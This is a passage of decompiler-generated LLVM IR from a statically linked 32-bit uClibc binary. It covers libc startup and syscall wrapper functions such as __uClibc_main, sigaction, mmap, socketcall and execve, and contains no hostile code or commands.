entry.dec_label_pc_8053a8b_crit_edge:             ; preds = %entry
  %v0_8053a8e.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8053a8b

dec_label_pc_8053a5b:                             ; preds = %entry
  store i8 1, i8* @global_var_80677dc.772, align 4
  store i32 4096, i32* @global_var_80677d0.694, align 16
  %v0_8053a86 = call i32 @_stdio_init()
  br label %dec_label_pc_8053a8b

dec_label_pc_8053a8b:                             ; preds = %entry.dec_label_pc_8053a8b_crit_edge, %dec_label_pc_8053a5b
  %v0_8053a8e = phi i32 [ %v0_8053a8e.pre, %entry.dec_label_pc_8053a8b_crit_edge ], [ %v0_8053a86, %dec_label_pc_8053a5b ]
  ret i32 %v0_8053a8e

; uselistorder directives
  uselistorder i8* @global_var_80677dc.772, { 1, 0 }
  uselistorder label %dec_label_pc_8053a8b, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  store i32 %tmp31, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_80677c8.773, align 8
  store i32 %arg6, i32* @global_var_80677d8.770, align 8
  %v2_8053ac6 = mul i32 %arg2, 4
  %v3_8053ac6 = add i32 %tmp31, %v2_8053ac6
  %v1_8053ac9 = add i32 %v3_8053ac6, 4
  store i32 %v1_8053ac9, i32* @global_var_80677cc.765, align 4
  %v3_8053ad1 = load i32, i32* %arg3, align 4
  %v14_8053ad1 = icmp eq i32 %v1_8053ac9, %v3_8053ad1
  %v1_8053ad3 = icmp eq i1 %v14_8053ad1, false
  br i1 %v1_8053ad3, label %dec_label_pc_8053adb, label %dec_label_pc_8053ad5

dec_label_pc_8053ad5:                             ; preds = %entry
  store i32 %v3_8053ac6, i32* @global_var_80677cc.765, align 4
  br label %dec_label_pc_8053adb

dec_label_pc_8053adb:                             ; preds = %entry, %dec_label_pc_8053ad5
  store i32 0, i32* %stack_var_-168, align 4
  %v2_8053ae0 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8053ae5 = bitcast i32* %stack_var_-136 to i8*
  %v4_8053ae5 = call i32 @__GI_memset(i8* %v3_8053ae5, i32 0, i32 120)
  %v0_8053aea = load i32, i32* @global_var_80677cc.765, align 4
  br label %dec_label_pc_8053af2

dec_label_pc_8053af2:                             ; preds = %dec_label_pc_8053af2, %dec_label_pc_8053adb
  %v0_8053af2 = phi i32 [ %v1_8053af5, %dec_label_pc_8053af2 ], [ %v0_8053aea, %dec_label_pc_8053adb ]
  %v1_8053af2 = inttoptr i32 %v0_8053af2 to i32*
  %v2_8053af2 = load i32, i32* %v1_8053af2, align 4
  %v3_8053af2 = icmp eq i32 %v2_8053af2, 0
  %v1_8053af5 = add i32 %v0_8053af2, 4
  %v1_8053af8 = icmp eq i1 %v3_8053af2, false
  br i1 %v1_8053af8, label %dec_label_pc_8053af2, label %dec_label_pc_8053b19.preheader

dec_label_pc_8053b19.preheader:                   ; preds = %dec_label_pc_8053af2
  store i32 %v1_8053af5, i32* @ebx, align 4
  %v1_8053b191 = inttoptr i32 %v1_8053af5 to i32*
  %v2_8053b192 = load i32, i32* %v1_8053b191, align 4
  %v3_8053b193 = icmp eq i32 %v2_8053b192, 0
  %v1_8053b1c10 = icmp eq i1 %v3_8053b193, false
  br i1 %v1_8053b1c10, label %dec_label_pc_8053afe.lr.ph, label %dec_label_pc_8053b1e

dec_label_pc_8053afe.lr.ph:                       ; preds = %dec_label_pc_8053b19.preheader
  %v3_8053ade = ptrtoint i32* %stack_var_-168 to i32
  %v3_8053b09 = add i32 %v3_8053ade, 32
  br label %dec_label_pc_8053afe

dec_label_pc_8053afe:                             ; preds = %dec_label_pc_8053afe.lr.ph, %dec_label_pc_8053b16
  %v1_8053b09 = phi i32 [ %v2_8053b192, %dec_label_pc_8053afe.lr.ph ], [ %v2_8053b19, %dec_label_pc_8053b16 ]
  %v0_8053b08 = phi i32 [ %v1_8053af5, %dec_label_pc_8053afe.lr.ph ], [ %v1_8053b16, %dec_label_pc_8053b16 ]
  %v6_8053b03 = icmp ugt i32 %v1_8053b09, 14
  br i1 %v6_8053b03, label %dec_label_pc_8053b16, label %dec_label_pc_8053b05

dec_label_pc_8053b05:                             ; preds = %dec_label_pc_8053afe
  store i32 %v0_8053b08, i32* %stack_var_-168, align 4
  %v2_8053b09 = mul i32 %v1_8053b09, 8
  %v4_8053b09 = add i32 %v3_8053b09, %v2_8053b09
  %v3_8053b0e = inttoptr i32 %v4_8053b09 to i16*
  %v4_8053b0e = call i32 @memcpy(i16* %v3_8053b0e, i32 %v0_8053b08, i32 8)
  %v0_8053b16.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053b16

dec_label_pc_8053b16:                             ; preds = %dec_label_pc_8053afe, %dec_label_pc_8053b05
  %v0_8053b16 = phi i32 [ %v0_8053b08, %dec_label_pc_8053afe ], [ %v0_8053b16.pre, %dec_label_pc_8053b05 ]
  %v1_8053b16 = add i32 %v0_8053b16, 8
  store i32 %v1_8053b16, i32* @ebx, align 4
  %v1_8053b19 = inttoptr i32 %v1_8053b16 to i32*
  %v2_8053b19 = load i32, i32* %v1_8053b19, align 4
  %v3_8053b19 = icmp eq i32 %v2_8053b19, 0
  %v1_8053b1c = icmp eq i1 %v3_8053b19, false
  br i1 %v1_8053b1c, label %dec_label_pc_8053afe, label %dec_label_pc_8053b1e

dec_label_pc_8053b1e:                             ; preds = %dec_label_pc_8053b16, %dec_label_pc_8053b19.preheader
  store i32 %v2_8053ae0, i32* @eax, align 4
  %v0_8053b22 = call i32 @_dl_aux_init()
  store i32 %v0_8053b22, i32* @eax, align 4
  %v0_8053b27 = call i32 @__GI___uClibc_init()
  %v1_8053b30 = icmp eq i32 %tmp26, 0
  %v1_8053b32 = icmp eq i1 %v1_8053b30, false
  br i1 %v1_8053b32, label %dec_label_pc_8053b38, label %dec_label_pc_8053b34

dec_label_pc_8053b34:                             ; preds = %dec_label_pc_8053b1e
  %v1_8053b34 = and i32 %tmp26, -65536
  %v2_8053b34 = or i32 %v1_8053b34, 4096
  br label %dec_label_pc_8053b38

dec_label_pc_8053b38:                             ; preds = %dec_label_pc_8053b1e, %dec_label_pc_8053b34
  %v0_8053b38 = phi i32 [ %tmp26, %dec_label_pc_8053b1e ], [ %v2_8053b34, %dec_label_pc_8053b34 ]
  store i32 %v0_8053b38, i32* @global_var_80677d0.694, align 16
  %v13_8053b3d = icmp eq i32 %tmp25, -1
  %v1_8053b42 = icmp eq i1 %v13_8053b3d, false
  br i1 %v1_8053b42, label %dec_label_pc_8053b6d, label %dec_label_pc_8053b44

dec_label_pc_8053b44:                             ; preds = %dec_label_pc_8053b38
  %v0_8053b44 = call i32 @getuid()
  store i32 %v0_8053b44, i32* @ebx, align 4
  %v0_8053b4b = call i32 @geteuid()
  %v0_8053b50 = load i32, i32* @ebx, align 4
  %v12_8053b50 = icmp eq i32 %v0_8053b50, %v0_8053b4b
  %v1_8053b52 = icmp eq i1 %v12_8053b50, false
  br i1 %v1_8053b52, label %dec_label_pc_8053b83, label %dec_label_pc_8053b54

dec_label_pc_8053b54:                             ; preds = %dec_label_pc_8053b44
  %v0_8053b54 = call i32 @getgid()
  store i32 %v0_8053b54, i32* @ebx, align 4
  %v0_8053b5b = call i32 @getegid()
  %v0_8053b60 = load i32, i32* @ebx, align 4
  %v12_8053b60 = icmp eq i32 %v0_8053b60, %v0_8053b5b
  %v1_8053b62 = icmp eq i1 %v12_8053b60, false
  br i1 %v1_8053b62, label %dec_label_pc_8053b83, label %dec_label_pc_8053b64.thread

dec_label_pc_8053b64.thread:                      ; preds = %dec_label_pc_8053b54
  br label %dec_label_pc_8053bad

dec_label_pc_8053b6d:                             ; preds = %dec_label_pc_8053b38
  %v15_8053b6d = icmp eq i32 %tmp25, %tmp24
  %v1_8053b71 = icmp eq i1 %v15_8053b6d, false
  br i1 %v1_8053b71, label %dec_label_pc_8053b83, label %dec_label_pc_8053b73

dec_label_pc_8053b73:                             ; preds = %dec_label_pc_8053b6d
  br label %dec_label_pc_8053b83

dec_label_pc_8053b83:                             ; preds = %dec_label_pc_8053b73, %dec_label_pc_8053b6d, %dec_label_pc_8053b54, %dec_label_pc_8053b44
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8053b8a = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8053b99 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8053ba8 = call i32 @__check_one_fd()
  br label %dec_label_pc_8053bad

dec_label_pc_8053bad:                             ; preds = %dec_label_pc_8053b64.thread, %dec_label_pc_8053b83
  store i32 ptrtoint (i32* @global_var_8061000.767 to i32), i32* %esi.global-to-local, align 4
  %v0_8053bb2 = load i32, i32* @edi, align 4
  %v1_8053bb2 = inttoptr i32 %v0_8053bb2 to i32*
  %v2_8053bb2 = load i32, i32* %v1_8053bb2, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_8061000.767 to i32), i32 -134615040), i32* %esi.global-to-local, align 4
  store i32 %v2_8053bb2, i32* inttoptr (i32 134616376 to i32*), align 8
  store i32 sdiv (i32 add (i32 ptrtoint (i32* @global_var_8061000.767 to i32), i32 -134615040), i32 4), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_80677d4.769, align 4
  br i1 icmp ugt (i32 add (i32 ptrtoint (i32* @global_var_8061000.767 to i32), i32 -134615037), i32 6), label %dec_label_pc_8053bd2, label %dec_label_pc_8053bde

dec_label_pc_8053bd2:                             ; preds = %dec_label_pc_8053bad, %dec_label_pc_8053bd2
  %v4_8053bd247 = phi i32 [ %v1_8053bd9, %dec_label_pc_8053bd2 ], [ 0, %dec_label_pc_8053bad ]
  %v5_8053bd2 = mul i32 %v4_8053bd247, 4
  %v6_8053bd2 = add i32 %v5_8053bd2, ptrtoint (i32* @global_var_8061000.767 to i32)
  %v7_8053bd2 = inttoptr i32 %v6_8053bd2 to i32*
  %v8_8053bd2 = load i32, i32* %v7_8053bd2, align 4
  call void @__pseudo_call(i32 %v8_8053bd2)
  %v0_8053bd9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053bd9 = add i32 %v0_8053bd9, 1
  store i32 %v1_8053bd9, i32* %ebx.global-to-local, align 4
  %v1_8053bda.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8053bda = icmp ult i32 %v1_8053bd9, %v1_8053bda.pre
  br i1 %v7_8053bda, label %dec_label_pc_8053bd2, label %dec_label_pc_8053bde

dec_label_pc_8053bde:                             ; preds = %dec_label_pc_8053bd2, %dec_label_pc_8053bad
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8061000.767 to i32), i32 -134615040), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8061000.767 to i32), i32 -134615040), i32 2), i32 0), label %dec_label_pc_8053bf6, label %dec_label_pc_8053c02

dec_label_pc_8053bf6:                             ; preds = %dec_label_pc_8053bde, %dec_label_pc_8053bf6
  %v4_8053bf644 = phi i32 [ %v1_8053bfd, %dec_label_pc_8053bf6 ], [ 0, %dec_label_pc_8053bde ]
  store i32 ptrtoint (i32* @global_var_8053bfd.776 to i32), i32* %stack_var_-168, align 4
  %v5_8053bf6 = mul i32 %v4_8053bf644, 4
  %v6_8053bf6 = add i32 %v5_8053bf6, ptrtoint (i32* @global_var_8061000.767 to i32)
  %v7_8053bf6 = inttoptr i32 %v6_8053bf6 to i32*
  %v8_8053bf6 = load i32, i32* %v7_8053bf6, align 4
  call void @__pseudo_call(i32 %v8_8053bf6)
  %v0_8053bfd = load i32, i32* @ebx, align 4
  %v1_8053bfd = add i32 %v0_8053bfd, 1
  store i32 %v1_8053bfd, i32* @ebx, align 4
  %v1_8053bfe.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8053bfe = icmp ult i32 %v1_8053bfd, %v1_8053bfe.pre
  br i1 %v7_8053bfe, label %dec_label_pc_8053bf6, label %dec_label_pc_8053c02

dec_label_pc_8053c02:                             ; preds = %dec_label_pc_8053bf6, %dec_label_pc_8053bde
  %v0_8053c0b = load i32, i32* %stack_var_-168, align 4
  %v1_8053c0b = call i32 @__errno_location(i32 %v0_8053c0b)
  %v1_8053c10 = inttoptr i32 %v1_8053c0b to i32*
  store i32 0, i32* %v1_8053c10, align 4
  %v0_8053c1f = call i32 @__GI___h_errno_location()
  store i32 %v0_8053c1f, i32* @eax, align 4
  %v1_8053c24 = inttoptr i32 %v0_8053c1f to i32*
  store i32 0, i32* %v1_8053c24, align 4
  %v0_8053c31 = load i32, i32* @edi, align 4
  store i32 %v0_8053c31, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_8053c40 = load i32, i32* @eax, align 4
  %v1_8053c43 = call i32 @__GI_exit(i32 %v0_8053c40)
  %v0_8053c4d = load i32, i32* @ebx, align 4
  %v1_8053c4d = inttoptr i32 %v0_8053c4d to %sigcontext*
  %v2_8053c4d = call i32 @sigreturn(%sigcontext* %v1_8053c4d)
  %v0_8053c55 = load i32, i32* @ebx, align 4
  %v1_8053c55 = inttoptr i32 %v0_8053c55 to %sigcontext*
  %v2_8053c55 = call i32 @sigreturn(%sigcontext* %v1_8053c55)
  ret i32 %v2_8053c55

; uselistorder directives
  uselistorder i32 %v1_8053bfd, { 1, 2, 0 }
  uselistorder i32 %v1_8053bd9, { 1, 2, 0 }
  uselistorder i32 %v2_8053b19, { 1, 0 }
  uselistorder i32 %v1_8053b16, { 2, 1, 0 }
  uselistorder i32 %v1_8053af5, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8053af2, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 5, 1, 3, 4, 2 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8061000.767 to i32), i32 -134615040), i32 2), { 0, 2, 3, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8061000.767 to i32), i32 -134615040), { 0, 2, 1 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 4096, { 22, 23, 6, 21, 17, 18, 0, 1, 7, 19, 16, 20, 13, 8, 3, 9, 14, 10, 4, 15, 11, 5, 2, 12 }
  uselistorder i32 14, { 2, 4, 3, 1, 0 }
  uselistorder label %dec_label_pc_8053bf6, { 1, 0 }
  uselistorder label %dec_label_pc_8053bd2, { 1, 0 }
  uselistorder label %dec_label_pc_8053bad, { 1, 0 }
  uselistorder label %dec_label_pc_8053b38, { 1, 0 }
  uselistorder label %dec_label_pc_8053b16, { 1, 0 }
  uselistorder label %dec_label_pc_8053afe, { 1, 0 }
  uselistorder label %dec_label_pc_8053adb, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_8053c57 = load i32, i32* @esi, align 4
  %v0_8053c58 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8053c6d = icmp eq i32* %arg2, null
  br i1 %v1_8053c6d, label %dec_label_pc_8053cc0, label %dec_label_pc_8053c71

dec_label_pc_8053c71:                             ; preds = %entry
  %v2_8053c71 = load i32, i32* %arg2, align 4
  store i32 %v2_8053c71, i32* %stack_var_-148, align 4
  %v1_8053c7a = add i32 %tmp11, 4
  %v3_8053c8c = bitcast i32* %stack_var_-136 to i16*
  %v4_8053c8c = call i32 @memcpy(i16* %v3_8053c8c, i32 %v1_8053c7a, i32 128)
  %v1_8053c91 = add i32 %tmp11, 132
  %v2_8053cab = inttoptr i32 %v1_8053c91 to i8*
  %v3_8053cab = load i8, i8* %v2_8053cab, align 1
  %v4_8053cab = and i8 %v3_8053cab, 4
  %v5_8053cab = icmp eq i8 %v4_8053cab, 0
  %v1_8053cb2 = icmp eq i1 %v5_8053cab, false
  br i1 %v1_8053cb2, label %dec_label_pc_8053cc0, label %dec_label_pc_8053cb4

dec_label_pc_8053cb4:                             ; preds = %dec_label_pc_8053c71
  br label %dec_label_pc_8053cc0

dec_label_pc_8053cc0:                             ; preds = %dec_label_pc_8053cb4, %dec_label_pc_8053c71, %entry
  %v1_8053cc2 = icmp eq i32 %arg3, 0
  br i1 %v1_8053cc2, label %dec_label_pc_8053cca, label %dec_label_pc_8053cc6

dec_label_pc_8053cc6:                             ; preds = %dec_label_pc_8053cc0
  %v2_8053cc6 = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_8053cca

dec_label_pc_8053cca:                             ; preds = %dec_label_pc_8053cc0, %dec_label_pc_8053cc6
  %v0_8053cd9 = phi i32 [ 0, %dec_label_pc_8053cc0 ], [ %v2_8053cc6, %dec_label_pc_8053cc6 ]
  br i1 %v1_8053c6d, label %dec_label_pc_8053cd7, label %dec_label_pc_8053cd0

dec_label_pc_8053cd0:                             ; preds = %dec_label_pc_8053cca
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_8053cd7

dec_label_pc_8053cd7:                             ; preds = %dec_label_pc_8053cca, %dec_label_pc_8053cd0
  %v0_8053cda = phi %sigaction* [ null, %dec_label_pc_8053cca ], [ %phitmp, %dec_label_pc_8053cd0 ]
  %v5_8053ce2 = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_8053cda, i32 %v0_8053cd9, i32 8)
  store i32 %v5_8053ce2, i32* %ebx.global-to-local, align 4
  br i1 %v1_8053cc2, label %dec_label_pc_8053d25, label %dec_label_pc_8053cf0

dec_label_pc_8053cf0:                             ; preds = %dec_label_pc_8053cd7
  %v2_8053cf0 = icmp slt i32 %v5_8053ce2, 0
  br i1 %v2_8053cf0, label %dec_label_pc_8053d25, label %dec_label_pc_8053cf4

dec_label_pc_8053cf4:                             ; preds = %dec_label_pc_8053cf0
  %v3_8053cf4 = load i32, i32* %stack_var_-288, align 4
  %v2_8053cf8 = inttoptr i32 %arg3 to i32*
  store i32 %v3_8053cf4, i32* %v2_8053cf8, align 4
  %v2_8053d00 = ptrtoint i32* %stack_var_-276 to i32
  %v1_8053d05 = add i32 %arg3, 4
  %v3_8053d09 = inttoptr i32 %v1_8053d05 to i16*
  %v4_8053d09 = call i32 @memcpy(i16* %v3_8053d09, i32 %v2_8053d00, i32 128)
  %v2_8053d12 = add i32 %arg3, 132
  %v3_8053d12 = inttoptr i32 %v2_8053d12 to i32*
  %v2_8053d1f = add i32 %arg3, 136
  %v3_8053d1f = inttoptr i32 %v2_8053d1f to i32*
  %v0_8053d25.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053d25

dec_label_pc_8053d25:                             ; preds = %dec_label_pc_8053cf0, %dec_label_pc_8053cd7, %dec_label_pc_8053cf4
  %v0_8053d25 = phi i32 [ %v5_8053ce2, %dec_label_pc_8053cf0 ], [ %v5_8053ce2, %dec_label_pc_8053cd7 ], [ %v0_8053d25.pre, %dec_label_pc_8053cf4 ]
  store i32 %v0_8053c58, i32* @ebx, align 4
  store i32 %v0_8053c57, i32* @esi, align 4
  ret i32 %v0_8053d25

; uselistorder directives
  uselistorder i32 %v5_8053ce2, { 0, 1, 3, 2 }
  uselistorder i1 %v1_8053cc2, { 1, 0 }
  uselistorder i1 %v1_8053c6d, { 1, 0 }
  uselistorder i32 %tmp11, { 1, 0, 2 }
  uselistorder i32* null, { 2, 6, 3, 7, 8, 9, 0, 10, 11, 1, 12, 13, 14, 15, 16, 17, 18, 19, 4, 5 }
  uselistorder i32 %arg3, { 2, 1, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_8053d25, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053cd7, { 1, 0 }
  uselistorder label %dec_label_pc_8053cca, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_8053d33 = load i32, i32* @eax, align 4
  %v1_8053d35 = sub i32 0, %v0_8053d33
  %v1_8053d37 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v2_8053d3c = inttoptr i32 %v1_8053d37 to i32*
  store i32 %v1_8053d35, i32* %v2_8053d3c, align 4
  ret i32 -1
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_8053d48 = load i32, i32* @ebx, align 4
  %v2_8053d4f = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_8053d4f, i32* @ebx, align 4
  %v8_8053d53 = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8053d48, i32* @ebx, align 4
  %v3_8053d5c = icmp ugt i32 %v8_8053d53, -4096
  call void @__pseudo_cond_branch(i1 %v3_8053d5c, i32 134561072)
  ret i32 %v8_8053d53

; uselistorder directives
  uselistorder i32 %v8_8053d53, { 1, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134561072, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053d64 = load i32, i32* @ebx, align 4
  store i32 %v0_8053d64, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8053d77 = call i32 @int80_syscall(i32 102)
  store i32 %v1_8053d77, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_8053d77, -4095
  br i1 %tmp8, label %dec_label_pc_8053d90, label %dec_label_pc_8053d84

dec_label_pc_8053d84:                             ; preds = %entry
  %v0_8053d84 = load i32, i32* %stack_var_-4, align 4
  %v1_8053d84 = call i32 @__errno_location(i32 %v0_8053d84)
  %v0_8053d89 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053d89 = sub i32 0, %v0_8053d89
  %v2_8053d8b = inttoptr i32 %v1_8053d84 to i32*
  store i32 %v1_8053d89, i32* %v2_8053d8b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053d90

dec_label_pc_8053d90:                             ; preds = %entry, %dec_label_pc_8053d84
  %v0_8053d90 = phi i32 [ %v1_8053d77, %entry ], [ -1, %dec_label_pc_8053d84 ]
  %v2_8053d92 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053d92, i32* @edx, align 4
  %v2_8053d94 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053d94, i32* @ebx, align 4
  ret i32 %v0_8053d90

; uselistorder directives
  uselistorder i32 %v1_8053d77, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 102, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8053d90, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8053d99 = load i32, i32* @esi, align 4
  store i32 %v0_8053d99, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8053dad = load i32, i32* @ebx, align 4
  %v7_8053db5 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_8053db5, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_8053db5, -4095
  br i1 %tmp13, label %dec_label_pc_8053dcd, label %dec_label_pc_8053dc1

dec_label_pc_8053dc1:                             ; preds = %entry
  %v1_8053dc1 = call i32 @__errno_location(i32 %v0_8053dad)
  %v0_8053dc6 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053dc6 = sub i32 0, %v0_8053dc6
  %v2_8053dc8 = inttoptr i32 %v1_8053dc1 to i32*
  store i32 %v1_8053dc6, i32* %v2_8053dc8, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8053dcd

dec_label_pc_8053dcd:                             ; preds = %entry, %dec_label_pc_8053dc1
  %v0_8053dcd = phi i32 [ %v7_8053db5, %entry ], [ -1, %dec_label_pc_8053dc1 ]
  %v2_8053dcf = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053dcf, i32* @edx, align 4
  %v2_8053dd0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8053dd0, i32* @esi, align 4
  ret i32 %v0_8053dcd

; uselistorder directives
  uselistorder i32 %v7_8053db5, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053dcd, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053dd4 = load i32, i32* @ebx, align 4
  store i32 %v0_8053dd4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_8053de7 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_8053de7, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v4_8053de7, -4095
  br i1 %tmp9, label %dec_label_pc_8053e00, label %dec_label_pc_8053df4

dec_label_pc_8053df4:                             ; preds = %entry
  %v0_8053df4 = load i32, i32* %stack_var_-4, align 4
  %v1_8053df4 = call i32 @__errno_location(i32 %v0_8053df4)
  %v0_8053df9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053df9 = sub i32 0, %v0_8053df9
  %v2_8053dfb = inttoptr i32 %v1_8053df4 to i32*
  store i32 %v1_8053df9, i32* %v2_8053dfb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053e00

dec_label_pc_8053e00:                             ; preds = %entry, %dec_label_pc_8053df4
  %v0_8053e00 = phi i32 [ %v4_8053de7, %entry ], [ -1, %dec_label_pc_8053df4 ]
  %v2_8053e02 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053e02, i32* @edx, align 4
  %v2_8053e04 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053e04, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8053e00

; uselistorder directives
  uselistorder i32 %v4_8053de7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053e00, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053e08 = load i32, i32* @edi, align 4
  store i32 %v0_8053e08, i32* %stack_var_-4, align 4
  %v4_8053e0c = ptrtoint i8* %arg1 to i32
  store i32 %v4_8053e0c, i32* %edi.global-to-local, align 4
  %v0_8053e18 = load i32, i32* @ebx, align 4
  %v5_8053e20 = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_8053e20 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_8053e20 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_8053e20, [1 x i8*] %v8_8053e20)
  store i32 %v9_8053e20, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_8053e20, -4095
  br i1 %tmp12, label %dec_label_pc_8053e38, label %dec_label_pc_8053e2c

dec_label_pc_8053e2c:                             ; preds = %entry
  %v1_8053e2c = call i32 @__errno_location(i32 %v0_8053e18)
  %v0_8053e31 = load i32, i32* %edi.global-to-local, align 4
  %v1_8053e31 = sub i32 0, %v0_8053e31
  %v2_8053e33 = inttoptr i32 %v1_8053e2c to i32*
  store i32 %v1_8053e31, i32* %v2_8053e33, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8053e38

dec_label_pc_8053e38:                             ; preds = %entry, %dec_label_pc_8053e2c
